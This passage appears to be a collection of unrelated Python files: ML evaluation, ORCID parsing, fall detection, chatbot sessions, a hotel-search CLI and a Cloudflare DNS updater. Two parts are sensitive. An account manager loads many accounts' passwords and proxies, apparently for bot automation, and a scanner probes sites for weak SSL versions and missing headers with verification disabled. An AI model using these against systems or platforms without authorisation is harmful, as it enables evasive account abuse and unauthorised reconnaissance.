[\"/path/to/your/model\"]\r\nevaluator = ModelEvaluator(model_dirs, ModelType.gemma_7b_instruct, \"/root/bleurt/BLEURT-20\")\r\nevaluator.process_data()\r\n",
    "import csv\nimport os\n\n\nclass AccountManager:\n    def __init__(self):\n        self.accounts_file_path = os.path.join(os.path.abspath('data'), 'accounts.csv')\n        os.makedirs(os.path.dirname(self.accounts_file_path), exist_ok=True)\n\n    @staticmethod\n    def _check_csv_delimiter(file_path):\n        # Open the file in read mode\n        with open(file_path, 'r') as file:\n            # Read the first line and remove leading/trailing whitespaces\n            first_line = file.readline().strip()\n\n            # Check for the presence of a comma (',') as the delimiter\n            if ',' in first_line:\n                return ','\n            # Check for the presence of a semicolon (';') as the delimiter\n            elif ';' in first_line:\n                return ';'\n            # If neither comma nor semicolon is found, default to comma\n            else:\n                return ','\n\n    def get_accounts(self):\n        # Check if the data file exists\n        if not os.path.exists(self.accounts_file_path):\n            raise FileNotFoundError(f\"File 'accounts.csv' not found\")\n\n        # Determine the CSV delimiter by checking the file\n        delimiter = self._check_csv_delimiter(self.accounts_file_path)\n\n        # Initialize an empty list to store the result\n        result = []\n\n        # Open the data file and read its content\n        with open(self.accounts_file_path, \"r\", encoding=\"utf-8\", newline=\"\") as data:\n            # Read the header (first line) of the CSV file\n            heading = next(data)\n\n            # Create a CSV reader object with the specified delimiter\n            reader = csv.reader(data, delimiter=delimiter)\n\n            # Iterate over each row in the CSV file\n            for row in reader:\n                # Check if the value in the first column (index 0) is '1'\n                if row[0].strip() == '1':\n                    # Create a dictionary with 'email', 'password', and 'proxy' keys\n                    row_dict = {\n                        'email': row[1],\n                        'password': row[2],\n                        'username': row[3],\n                        'useragent': row[4],\n                        'proxy': row[5],\n                        'project_folder': row[6],\n                        'random_boards': row[7],\n                        'global_link': row[8],\n                    }\n                    # Append the dictionary to the result list\n                    result.append(row_dict)\n\n        # Check if any accounts were found; raise an exception if none are present\n        if not result:\n            raise Exception('No accounts in operation')\n\n        # Print the number of accounts in operation\n        print(f'{len(result)} accounts in work')\n\n        # Return the list of dictionaries representing the selected accounts\n        return result\n",
    "import os,time,random\nimport xml.etree.ElementTree as ET\nimport pandas as pd\nimport glob\nimport csv\n\nimport multiprocessing as mp\nimport concurrent.futures\nfrom tqdm import tqdm\nfrom joblib import Parallel, delayed\n\ndef flatten(matrix):\n    return [item for i in tqdm(matrix) for item in i]\n\ndef perData_process(xml_file,ns):\n    tree = ET.parse(xml_file)\n    root = tree.getroot()\n    perDataProcess = []\n\n    for actSummary in root.findall('act:activities-summary',ns):\n        for edu in actSummary.findall('act:educations',ns):\n            for eduAffiliationGroup in edu.findall('act:affiliation-group',ns):\n                for eduSummary in eduAffiliationGroup.findall('edu:education-summary',ns):\n                    eduStartDate = 0\n                    eduOrgName = eduOrgCity = eduOrgCountry = eduOrgRegion = None\n\n                    for eduStartDateElement in eduSummary.findall('com:start-date',ns):\n                        for eduStartDateYearElement in eduStartDateElement.findall('com:year',ns):\n                            eduStartDate += 10000 * int(eduStartDateYearElement.text)\n                        for eduStartDateMonthElement in eduStartDateElement.findall('com:month',ns):\n                            eduStartDate += 100 * int(eduStartDateMonthElement.text)\n                        for eduStartDateDayElement in eduStartDateElement.findall('com:day',ns):\n                            eduStartDate += int(eduStartDateDayElement.text)\n\n                    for eduOrg in eduSummary.findall('com:organization',ns):\n                        eduOrgName = eduOrg.find('com:name',ns).text\n\n                        for eduAddress in eduOrg.findall('com:address',ns):\n                            eduOrgCity = eduAddress.find('com:city',ns).text\n                            eduOrgCountry = eduAddress.find('com:country',ns).text\n\n                            for eduOrgRegionElement in eduAddress.findall('com:region',ns):\n                                eduOrgRegion = eduOrgRegionElement.text\n\n                    if eduStartDate != 0 and eduOrgName is not None:\n                        perDataProcess.append({'StartDate': eduStartDate,\n                            'OrgName': eduOrgName, 'OrgCity': eduOrgCity, 'OrgRegion': eduOrgRegion, 'OrgCountry': eduOrgCountry})\n\n        for emp in actSummary.findall('act:employments',ns):\n            for empAffiliationGroup in emp.findall('act:affiliation-group',ns):\n                for empSummary in empAffiliationGroup.findall('emp:employment-summary',ns):\n                    empStartDate = 0\n                    empOrgName = empOrgCity = empOrgRegion = empOrgCountry = None\n\n                    for empStartDateElement in empSummary.findall('com:start-date',ns):\n                        for empStartDateYearElement in empStartDateElement.findall('com:year',ns):\n                            empStartDate += 10000 * int(empStartDateYearElement.text)\n                        for empStartDateMonthElement in empStartDateElement.findall('com:month',ns):\n                            empStartDate += 100 * int(empStartDateMonthElement.text)\n                        for empStartDateDayElement in empStartDateElement.findall('com:day',ns):\n                            empStartDate += int(empStartDateDayElement.text)\n\n                    for empOrg in empSummary.findall('com:organization',ns):\n                        empOrgName = empOrg.find('com:name',ns).text\n\n                        for empAddress in empOrg.findall('com:address',ns):\n                            empOrgCity = empAddress.find('com:city',ns).text\n                            empOrgCountry = empAddress.find('com:country',ns).text\n\n                            for empOrgRegionElement in empAddress.findall('com:region',ns):\n                                empOrgRegion = empOrgRegionElement.text\n\n                    if empStartDate != 0 and empOrgName is not None:\n                        perDataProcess.append({'StartDate': empStartDate,\n                            'OrgName': empOrgName, 'OrgCity': empOrgCity, 'OrgRegion': empOrgRegion, 'OrgCountry': empOrgCountry})\n\n    return perDataProcess\n\ndef perData_proc_batch(batch,ns):\n  return [perData_process(xml_file,ns)\n    for xml_file in tqdm(batch)]\n\ndef perData_batch_file(array,n_workers):\n  file_len = len(array)\n  batch_size = round(file_len / n_workers)\n  batches = [array[ix : ix + batch_size]\n    for ix in tqdm(range(0,file_len,batch_size))]\n  return batches\n\ndef perData_sortDate(x):\n    return x['StartDate']\n\ndef dataFlow_process(perDataElement):\n    perDataCouName = []\n    dataFlowProcess = []\n    \n    lenPerDataElement = len(perDataElement)\n    for x in tqdm(range(lenPerDataElement)):\n        perDataElementX = perDataElement[x]\n\n        lenPerDataElementX = len(perDataElement[x])\n        for y in range(1,lenPerDataElementX):\n            ori = perDataElementX[y-1]\n            des = perDataElementX[y]\n    \n            dataFlowOrigin = ori['OrgCountry']\n            dataFlowDestination = des['OrgCountry']\n ",
    "import cv2\nimport cvzone\nimport math\nfrom ultralytics import YOLO\nimport requests\nimport time\nimport math\n\n#Create your own Telegram bot and input your Telegram bot token and chat ID into the designated variables\ntelegram_bot_token = 'ENTER YOUR TELEGRAM BOT TOKEN'\nchat_id = 'ENTER YOUR CHAT ID'\nlast_notification_time = 0\nnotification_interval = 60  #customize notification interval as you want\n\ndef send_telegram_message(message, img_path=None):\n    global last_notification_time\n    current_time = time.time()\n    if current_time - last_notification_time >= notification_interval:\n        url = f'https://api.telegram.org/bot{telegram_bot_token}/sendMessage'\n        payload = {\n            'chat_id': chat_id,\n            'text': message\n        }\n        response = requests.post(url, json=payload)\n        print(response.json())\n        if img_path:\n            files = {'photo': open(img_path, 'rb')}\n            url = f'https://api.telegram.org/bot{telegram_bot_token}/sendPhoto'\n            response = requests.post(url, files=files, data=payload)\n            print(response.json())\n        last_notification_time = current_time\n\ncap = cv2.VideoCapture('fall.mp4')\n\nmodel = YOLO('yolov8s.pt')\n\nclassnames = []\nwith open('classes.txt', 'r') as f:\n    classnames = f.read().splitlines()\n\n\nwhile True:\n    ret, frame = cap.read()\n    frame = cv2.resize(frame, (980,740))\n\n    results = model(frame)\n\n    for info in results:\n        parameters = info.boxes\n        for box in parameters:\n            x1, y1, x2, y2 = box.xyxy[0]\n            x1, y1, x2, y2 = int(x1), int(y1), int(x2), int(y2)\n            confidence = box.conf[0]\n            class_detect = box.cls[0]\n            class_detect = int(class_detect)\n            class_detect = classnames[class_detect]\n            conf = math.ceil(confidence * 100)\n\n\n            # implement fall detection using the coordinates x1,y1,x2\n            height = y2 - y1\n            width = x2 - x1\n            threshold  = height - width\n\n            if conf > 80 and class_detect == 'person':\n                cvzone.cornerRect(frame, [x1, y1, width, height], l=30, rt=6)\n                cvzone.putTextRect(frame, f'{class_detect}', [x1 + 8, y1 - 12], thickness=2, scale=2)\n            \n            if threshold < -20: #non customised value : 0\n                cvzone.putTextRect(frame, 'Fall Detected', [height, width], thickness=2, scale=2,colorR=(0,0,255))\n                cv2.imwrite('fall_image.jpg', frame)\n                send_telegram_message(\"Alert, Person Fell Down\", img_path='fall_image.jpg')\n            \n            else:pass\n\n\n    cv2.imshow('frame', frame)\n    if cv2.waitKey(1) & 0xFF == ord('t'):\n        break\n\n\ncap.release()\ncv2.destroyAllWindows()\n",
    "from common.expired_dict import ExpiredDict\nfrom common.log import logger\nfrom config import conf\n\nclass Session(object):\n    def __init__(self, session_id, system_prompt=None):\n        self.session_id = session_id\n        self.messages = []\n        if system_prompt is None:\n            self.system_prompt = conf().get(\"character_desc\", \"\")\n        else:\n            self.system_prompt = system_prompt\n\n    # \u91cd\u7f6e\u4f1a\u8bdd\n    def reset(self):\n        system_item = {'role': 'system', 'content': self.system_prompt}\n        self.messages = [system_item]\n\n    def set_system_prompt(self, system_prompt):\n        self.system_prompt = system_prompt\n        self.reset()\n\n    def add_query(self, query):\n        user_item = {'role': 'user', 'content': query}\n        self.messages.append(user_item)\n\n    def add_reply(self, reply):\n        assistant_item = {'role': 'assistant', 'content': reply}\n        self.messages.append(assistant_item)\n    \n    def discard_exceeding(self, max_tokens=None, cur_tokens=None):\n        raise NotImplementedError\n\n\n\nclass SessionManager(object):\n    def __init__(self, sessioncls, **session_args):\n        if conf().get('expires_in_seconds'):\n            sessions = ExpiredDict(conf().get('expires_in_seconds'))\n        else:\n            sessions = dict()\n        self.sessions = sessions\n        self.sessioncls = sessioncls\n        self.session_args = session_args\n\n    def build_session(self, session_id, system_prompt=None):\n        '''\n            \u5982\u679csession_id\u4e0d\u5728sessions\u4e2d\uff0c\u521b\u5efa\u4e00\u4e2a\u65b0\u7684session\u5e76\u6dfb\u52a0\u5230sessions\u4e2d\n            \u5982\u679csystem_prompt\u4e0d\u4f1a\u7a7a\uff0c\u4f1a\u66f4\u65b0session\u7684system_prompt\u5e76\u91cd\u7f6esession\n        '''\n        if session_id not in self.sessions:\n            self.sessions[session_id] = self.sessioncls(session_id, system_prompt, **self.session_args)\n        elif system_prompt is not None: # \u5982\u679c\u6709\u65b0\u7684system_prompt\uff0c\u66f4\u65b0\u5e76\u91cd\u7f6esession\n            self.sessions[session_id].set_system_prompt(system_prompt)\n        session = self.sessions[session_id]\n        return session\n    \n    def session_query(self, query, session_id):\n        session = self.build_session(session_id)\n        session.add_query(query)\n        try:\n            max_tokens = conf().get(\"conversation_max_tokens\", 1000)\n            total_tokens = session.discard_exceeding(max_tokens, None)\n            logger.debug(\"prompt tokens used={}\".format(total_tokens))\n        except Exception as e:\n            logger.debug(\"Exception when counting tokens precisely for prompt: {}\".format(str(e)))\n        return session\n\n    def session_reply(self, reply, session_id, total_tokens = None):\n        session = self.build_session(session_id)\n        session.add_reply(reply)\n        try:\n            max_tokens = conf().get(\"conversation_max_tokens\", 1000)\n            tokens_cnt = session.discard_exceeding(max_tokens, total_tokens)\n            logger.debug(\"raw total_tokens={}, savesession tokens={}\".format(total_tokens, tokens_cnt))\n        except Exception as e:\n            logger.debug(\"Exception when counting tokens precisely for session: {}\".format(str(e)))\n        return session\n\n    def clear_session(self, session_id):\n        if session_id in self.sessions:\n            del(self.sessions[session_id])\n\n    def clear_all_session(self):\n        self.sessions.clear()\n",
    "import subprocess\nimport ssl\nimport socket\nimport sys\nimport requests\nimport random\nimport urllib3\nimport argparse\nimport json\nimport dns.resolver\nimport os\nimport hashlib\nimport shutil\nfrom bs4 import BeautifulSoup\nfrom datetime import datetime\nfrom colorama import Fore, Style\nfrom urllib.parse import urlparse\nfrom instagramy import InstagramUser\n\nurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n\nclass bcolors:\n    HEADER = '\\033[95m'\n    OKBLUE = '\\033[94m'\n    OKGREEN = '\\033[92m'\n    WARNING = '\\033[93m'\n    FAIL = '\\033[91m'\n    ENDC = '\\033[0m'\n    BOLD = '\\033[1m'\n    UNDERLINE = '\\033[4m'\n\n#for later use\ndef print_centered(text):\n    terminal_width = shutil.get_terminal_size().columns\n    padding_width = (terminal_width - len(text)) // 2\n    print(\" \" * padding_width + text)\n\ndef print_banner_with_border(text):\n    terminal_width = shutil.get_terminal_size().columns\n    text_length = len(text)\n    #print(\"\\n\")\n    print(Style.BRIGHT + \"-\" * (text_length + 4) + Style.RESET_ALL)  # Above Header\n    print(Style.BRIGHT + f\"| {text} |\" + Style.RESET_ALL)  # Header\n    print(Style.BRIGHT + \"-\" * (text_length + 4) + Style.RESET_ALL)  # Below Header\n\n\ndef print_banner(url):\n    ascii_banner = \"\"\"\n                                            \n\u2588\u2588\u2588\u2557   \u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2557   \u2588\u2588\u2557\n\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d \u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2551\n\u2588\u2588\u2554\u2588\u2588\u2588\u2588\u2554\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551  \u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2554\u2588\u2588\u2557 \u2588\u2588\u2551\n\u2588\u2588\u2551\u255a\u2588\u2588\u2554\u255d\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u255d  \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u255d  \u2588\u2588\u2551\u255a\u2588\u2588\u2557\u2588\u2588\u2551\n\u2588\u2588\u2551 \u255a\u2550\u255d \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551  \u2588\u2588\u2551\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551 \u255a\u2588\u2588\u2588\u2588\u2551\n\u255a\u2550\u255d     \u255a\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u2550\u2550\u255d\n                                                  \n    \"\"\"\n    print(ascii_banner)\n\ndef print_url(url):\n    print(f\"{bcolors.BOLD}{Fore.BLUE}{url}{Style.RESET_ALL}\\n\")  # User-supplied URL\n\ndef check_ssl_versions(url):\n    if url.startswith(\"http://\"):\n        print(\"HTTP protocol in use, skipping...\")\n        return\n\n    if url.startswith(\"https://\"):\n        try:\n            context = ssl.create_default_context()\n            context.minimum_version = ssl.TLSVersion.TLSv1_2\n            context.maximum_version = ssl.TLSVersion.TLSv1_3\n\n            url = url[8:]  # remove \"https://\"\n\n            with socket.create_connection((url, 443)) as sock:\n                with context.wrap_socket(sock, server_hostname=url) as ssock:\n                    ssl_version = ssock.version()\n                    print(f\"{url} TLS in use. Version: {ssl_version}\")\n\n        except ssl.SSLError as e:\n            if \"sslv3 alert handshake failure\" in str(e):\n                print(f\"{url} {Fore.RED}SSLv3 in use.{Style.RESET_ALL}\")\n            elif \"sslv2 alert handshake failure\" in str(e):\n                print(f\"{url} {Fore.RED}SSLv2 in use.{Style.RESET_ALL}\")\n            else:\n                print(f\"{url} SSL/TLS version unknown.\")\n        except Exception as e:\n            print(f\"Error: {e}\")\n    else:\n        print(\"Invalid URL.\")\n\n\ndef check_sslv2_support(url):\n    try:\n        if url.startswith(\"http://\"):\n            return\n        elif url.startswith(\"https://\"):\n            url = url[8:]\n            \n        result = subprocess.run(['openssl', 's_client', '-connect', f'{url}:443', '-ssl2'], capture_output=True, text=True, timeout=10)\n        if \"SSL-Session:\" in result.stdout:\n            print(f\"{url} {Fore.RED}SSLv2 supported.{Style.RESET_ALL}\")\n        else:\n            print(f\"{url} {Fore.GREEN}SSLv2 doesn't supported.{Style.RESET_ALL}\")\n    except subprocess.TimeoutExpired:\n        print(\"\u0130\u015flem zaman a\u015f\u0131m\u0131na u\u011frad\u0131.\")\n    except Exception as e:\n        print(f\"Hata: {e}\")\n\ndef check_sslv3_support(url):\n    try:\n        if url.startswith(\"http://\"):\n            return\n        elif url.startswith(\"https://\"):\n            url = url[8:]\n            \n        result = subprocess.run(['openssl', 's_client', '-connect', f'{url}:443', '-ssl3'], capture_output=True, text=True, timeout=10)\n        if \"SSL-Session:\" in result.stdout:\n            print(f\"{url} {Fore.RED}SSLv3 supported.{Style.RESET_ALL}\")\n        else:\n            print(f\"{url} {Fore.GREEN}SSLv3 doesn't supported.{Style.RESET_ALL}\")\n    except subprocess.TimeoutExpired:\n        print(\"The process has timed out.\")\n    except Exception as e:\n        print(f\"Error: {e}\")\n\n\ndef check_security_headers(url):\n    try:\n        response = requests.get(url, verify=False)\n        headers = response.headers\n\n        security_headers = {\n            \"X-Content-Type-Options\": \"X-Content-Type-Options\" in headers,\n            \"X-Frame-Options\": \"X-Frame-Options\" in headers,\n            \"Content-Security-Policy\": \"Content-Security-Policy\" in headers,\n            \"X-XSS-Protection\": \"X-XSS-Protection\" in headers,\n            \"Strict-Transport-Security\": \"Strict-Transport-Security\" in headers,\n            \"Referrer-Policy\": \"Referrer-Policy\" in headers,\n            \"Feature-Policy\": \"Feature-Policy\" in headers\n        }\n\n        return security_headers\n    except Exception as e:\n        print(\"Error:\", e)\n",
    "import importlib\nimport torch.utils.data\nfrom data.base_dataset import BaseDataset\n\n\ndef find_dataset_using_name(dataset_name, split='train'):\n    dataset_filename = \"data.\" + dataset_name + \"_dataset\"\n    datasetlib = importlib.import_module(dataset_filename)\n\n    dataset = None\n    target_dataset_name = dataset_name.replace('_', '') + 'dataset'\n    for name, cls in datasetlib.__dict__.items():\n        if name.lower() == target_dataset_name.lower() \\\n           and issubclass(cls, BaseDataset):\n            dataset = cls\n\n    if dataset is None:\n        raise NotImplementedError(\"In %s.py, there should be a subclass of \"\n                        \"BaseDataset with class name that matches %s in \"\n                        \"lowercase.\" % (dataset_filename, target_dataset_name))\n    return dataset\n\n\ndef create_dataset(dataset_name, split, opt):\n    data_loader = CustomDatasetDataLoader(dataset_name, split, opt)\n    dataset = data_loader.load_data()\n    return dataset\n\n\nclass CustomDatasetDataLoader():\n    def __init__(self, dataset_name, split, opt):\n        self.opt = opt\n        dataset_class = find_dataset_using_name(dataset_name, split)\n        self.dataset = dataset_class(opt, split, dataset_name)\n        self.imio = self.dataset.imio\n        print(\"dataset [%s(%s)] created\" % (dataset_name, split))\n        self.dataloader = torch.utils.data.DataLoader(\n            self.dataset,\n            batch_size=opt.batch_size if 'train' in split else 1,\n            shuffle=opt.shuffle and 'train' in split,\n            num_workers=int(opt.num_dataloader), \n            drop_last=opt.drop_last)\n\n    def load_data(self):\n        return self\n\n    def __len__(self):\n        \"\"\"Return the number of data in the dataset\"\"\"\n        return min(len(self.dataset), self.opt.max_dataset_size)\n\n    def __iter__(self):\n        \"\"\"Return a batch of data\"\"\"\n        for i, data in enumerate(self.dataloader):\n            if i * self.opt.batch_size >= self.opt.max_dataset_size:\n                break\n            yield data\n\nclass CustomDatasetDataLoader_testmore():\n    def __init__(self, dataset_name, split, opt):\n        self.opt = opt\n        dataset_class = find_dataset_using_name(dataset_name, split)\n        self.dataset = dataset_class(opt, split, dataset_name)\n        self.imio = self.dataset.imio\n        print(\"dataset [%s(%s)] created\" % (dataset_name, split))\n        self.dataloader = torch.utils.data.DataLoader(\n            self.dataset,\n            batch_size=opt.batch_size if 'train' in split else 16,\n            shuffle=opt.shuffle and 'train' in split,\n            num_workers=int(opt.num_dataloader), \n            drop_last=False)\n\n    def load_data(self):\n        return self\n\n    def __len__(self):\n        \"\"\"Return the number of data in the dataset\"\"\"\n        return min(len(self.dataset), self.opt.max_dataset_size)\n\n    def __iter__(self):\n        \"\"\"Return a batch of data\"\"\"\n        for i, data in enumerate(self.dataloader):\n            if i * self.opt.batch_size >= self.opt.max_dataset_size:\n                break\n            yield data\n\ndef create_dataset_testmore(dataset_name, split, opt):\n    data_loader = CustomDatasetDataLoader_testmore(dataset_name, split, opt)\n    dataset = data_loader.load_data()\n    return dataset",
    "import pytest\nimport torch\nfrom torch_featurelayer import FeatureLayers\nfrom torchvision.models import alexnet\n\n\ndef test_feature_layers():\n    model = alexnet()\n    layer_paths = [\n        'features.2',\n        'features.5',\n        'features.9',\n        'features.12',\n        'avgpool',\n        'classifier.2',\n        'classifier.4',\n    ]\n    hooked_model = FeatureLayers(model, layer_paths)\n\n    x = torch.randn(1, 3, 224, 224)\n    feature_outputs, output = hooked_model(x)\n\n    feature_output_shapes = {\n        'features.2': (1, 64, 27, 27),\n        'features.5': (1, 192, 13, 13),\n        'features.9': (1, 256, 13, 13),\n        'features.12': (1, 256, 6, 6),\n        'avgpool': (1, 256, 6, 6),\n        'classifier.2': (1, 4096),\n        'classifier.4': (1, 4096),\n    }\n    for layer_path, feature_output in feature_outputs.items():\n        assert feature_output.shape == feature_output_shapes[layer_path]\n    assert output.shape == (1, 1000)\n\n\ndef test_feature_layers_invalid_model():\n    with pytest.raises(AssertionError) as e:\n        model = 'invalid_model'\n        _ = FeatureLayers(model, ['features.2', 'features.5', 'features.9'])\n    assert str(e.value) == 'model must be a torch.nn.Module'\n\n\ndef test_feature_layers_contain_nonexistent_layer_path():\n    model = alexnet()\n    hooked_model = FeatureLayers(model, ['features.1', 'path.to.blah'])\n\n    x = torch.randn(1, 3, 224, 224)\n    feature_outputs, outputs = hooked_model(x)\n\n    assert feature_outputs['features.1'] is not None\n    assert feature_outputs['path.to.blah'] is None  # nonexistent layer path ignored\n    assert outputs is not None\n\n\ndef test_feature_layers_empty_layer_paths():\n    model = alexnet()\n    hooked_model = FeatureLayers(model, [])\n\n    x = torch.randn(1, 3, 224, 224)\n    feature_outputs, output = hooked_model(x)\n\n    assert feature_outputs == {}\n    assert output is not None\n",
    "import fhrlib as fhr\nimport argparse\nimport datetime\n\ndef checkArgs(args: dict):\n    # check that start date is today or later\n    assert args['begin'] >= datetime.datetime.date(datetime.datetime.today()), \"Start date must be no earlier than today.\"\n    assert args['end'] > args['begin'], \"End date cannot be today or earlier.\"\n    if 'city' in args:\n        assert 'state' in args, \"State and region must be provided if city is given.\"\n\nif __name__==\"__main__\":\n\n    parser = argparse.ArgumentParser(\n        description=\"Aggregates FHR search results from the Amex Travel website.\"\n        )\n    parser.add_argument('-b', '--begin', \n        required=True, \n        type=datetime.date.fromisoformat,\n        help=\"The start date for data queries. Format: YYYY-MM-DD\"\n        )\n    parser.add_argument('-e', '--end',\n        required=True,\n        type=datetime.date.fromisoformat,\n        help=\"The end date for data queries. Format: YYYY-MM-DD\"\n        )\n    parser.add_argument(\"-r\", \"--region\",\n        required=True,\n        type=str,\n        help=\"Required. The region used in the query.\",\n        choices=fhr.REGIONS,\n        metavar=\"REGION\"\n        )\n    parser.add_argument(\"-s\", \"--state\",\n        required=False,\n        type=str,\n        help=\"The state used in the query. Required if city is given.\",\n        choices=fhr.US_STATES,\n        metavar=\"STATE\"\n        )\n    parser.add_argument(\"-c\", \"--city\",\n        required=False,\n        default=None,\n        type=str,\n        help=\"\"\"The city used in the query.\n        City name needs to be capitalized.\n        This option isn't well tested - if not working,\n        don't use this option and use only the state of the city; you\n        should still be able to find the hotel in the data.\"\"\"\n        )\n    parser.add_argument(\"-o\", \"--output\",\n        required=False,\n        type=str,\n        help=\"\"\"If provided, all data used to generate the final graph\n        is saved to a csv file with this name.\"\"\"\n        )\n\n    args = parser.parse_args()\n    checkArgs(vars(args))\n\n    df = fhr.getDfForDatesInLoc(state=args.state, start_date=args.begin, end_date=args.end, city=args.city, fname=args.output, region=args.region)\n\n    fig = fhr.dfToFig(df)\n    fig.show()",
    "import requests\nimport json\n# import schedule\n# import time\n\nbot_token = '\u4f60\u7684tg\u673a\u5668\u4ebatoken'\nchat_id = '\u9700\u8981\u63a8\u9001\u901a\u77e5\u7684\u7fa4\u6216\u4e2a\u4ebaID'\ncf_account = '\u4f60\u7684cloudflare\u8d26\u53f7'\napi_key = '\u4f60\u7684cloudflare\u8d26\u53f7\u7684api\u5bc6\u94a5'\nzone_id = 'cloudflare\u4e2d\u9700\u8981\u4f7f\u7528\u811a\u672c\u7684\u57df\u540dzone_id'\nsub_domain = '\u9700\u8981\u4f7f\u7528\u811a\u672c\u7684\u57df\u540d\u6216\u5b50\u57df\u540d\uff0c\u4f8b\u5982 a.example.com'\n\n\ndef send_message(text):\n    message_data = {\n        'chat_id': chat_id,\n        'text': text,\n        'parse_mode': 'MarkdownV2'\n    }\n    print(text)\n    try:\n        res = requests.post(f'https://api.telegram.org/bot{bot_token}/sendMessage', json=message_data)\n        if res.status_code == 200:\n            print(\"\u53d1\u9001\u6210\u529f\")\n            res.close()\n        else:\n            print(\"\u53d1\u9001\u5931\u8d25\")\n    except Exception as e:\n        print(e)\n\n\ndef update_dns_ip(new_ip):\n    headers = {\n        \"X-Auth-Email\": cf_account,\n        \"X-Auth-Key\": api_key,\n    }\n\n    index_url = f\"https://api.cloudflare.com/client/v4/zones/{zone_id}/dns_records?name={sub_domain}\"\n    response = requests.get(index_url, headers=headers)\n    record_id = response.json()[\"result\"][0][\"id\"]\n\n    update_url = f\"https://api.cloudflare.com/client/v4/zones/{zone_id}/dns_records/{record_id}\"\n    payload = {\n        \"content\": new_ip\n    }\n    headers[\"Content-Type\"] = \"application/json\"\n    update_response = requests.patch(update_url, headers=headers, data=json.dumps(payload))\n    print(update_response.json())\n    if response.status_code == 200:\n        data = response.json()\n        if data[\"success\"]:\n            raw_msg = \"\u2705\u4f18\u9009IP\u66f4\u65b0\u6210\u529f\uff01\"\n            send_message(raw_msg)\n        else:\n            print(update_response.json())\n            raw_msg = f\"\u274c\u4f18\u9009IP\u66f4\u65b0\u5931\u8d25\uff0c\u72b6\u6001\u7801\uff1a{update_response.status_code}\"\n            send_message(raw_msg)\n    else:\n        raw_msg = f\"\u274c\u4f18\u9009IP\u66f4\u65b0\u5931\u8d25\uff0c\u72b6\u6001\u7801\uff1a{update_response.status_code}\"\n        send_message(raw_msg)\n\n\ndef get_current_ip():\n    api1 = \"https://monitor.gacjie.cn/api/client/get_ip_address\"\n    api2 = \"https://cfnode.eu.org/api/ajax/get_opt_v4\"\n\n    headers = {\n        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (HTML, like Gecko) Chrome/108.0.0.0 '\n                      'Safari/537.36'}\n\n    response = requests.get(url=api1, headers=headers, timeout=15).json()\n    try:\n        if response['msg'] == \"\u67e5\u8be2\u6210\u529f\":\n            ip_list = response['info']['CM']\n            ip_list1 = response['info']['CU']\n            ip_list2 = response['info']['CT']\n            lists = ip_list + ip_list1 + ip_list2\n            max_item = max(lists, key=lambda x: x['bandwidth'])\n            # \u63d0\u53d6\u5bf9\u5e94\u7684\u5b57\u6bb5\n            max_address = max_item['address']\n            max_bandwidth = max_item['bandwidth']\n            max_bandwidth = str(max_bandwidth) + \"MB\"\n            max_delay = max_item['delay']\n            max_colo = max_item['colo']\n            max_device_name = max_item['line_name']\n\n            text = f\"\u2705*\u672c\u6b21\u4f18\u9009IP\u83b7\u53d6\u6210\u529f*\\n*\u4ec5\u7f51\u9875\u52a0\u901f\uff0c\u4e0d\u53ef\u7528\u4e8e\u8282\u70b9*\\nCName\u57df\u540d\uff1a `{sub_domain}`\\n\u5f53\u524d\u6e90\uff1a`Default`\\n\u66f4\u65b0\u9891\u7387\uff1a`4H`\\n\\n\u6700\u4f18IP\uff1a`{max_address}`\\n\u901f\u5ea6\uff1a`{max_bandwidth}/S`\\n\u5ef6\u8fdf\uff1a`{max_delay} ms`\\n\u6570\u636e\u4e2d\u5fc3\uff1a`{max_colo}`\\n\u6d4b\u901f\u670d\u52a1\u5668\uff1a`{max_device_name}`\\n\\n\u5f00\u59cb\u5c1d\u8bd5\u5207\u6362DNS\u89e3\u6790\u2026\u2026\"\n            send_message(text)\n\n            update_dns_ip(max_address)\n\n        else:\n            res = requests.get(url=api2, headers=headers, timeout=15).json()\n            if res['msg'] == \"\u67e5\u8be2\u6210\u529f\":\n                ip_list = res['data']\n                max_item = max(ip_list, key=lambda x: x['bandwidth'])\n                # \u63d0\u53d6\u5bf9\u5e94\u7684\u5b57\u6bb5\n                max_address = max_item['address']\n                max_bandwidth = max_item['bandwidth']\n                max_delay = max_item['delay']\n                max_colo = max_item['colo']\n                max_device_name = max_item['device_name']\n\n                text = f\"\u2705*\u672c\u6b21\u4f18\u9009IP\u83b7\u53d6\u6210\u529f*\\n*\u4ec5\u7f51\u9875\u52a0\u901f\uff0c\u4e0d\u53ef\u7528\u4e8e\u8282\u70b9*\\nCName\u57df\u540d\uff1a `{sub_domain}`\\n\u5f53\u524d\u6e90\uff1a`Second`\\n\u66f4\u65b0\u9891\u7387\uff1a`4H`\\n\\n\u6700\u4f18IP\uff1a`{max_address}`\\n\u901f\u5ea6\uff1a`{max_bandwidth}/S`\\n\u5ef6\u8fdf\uff1a`{max_delay} 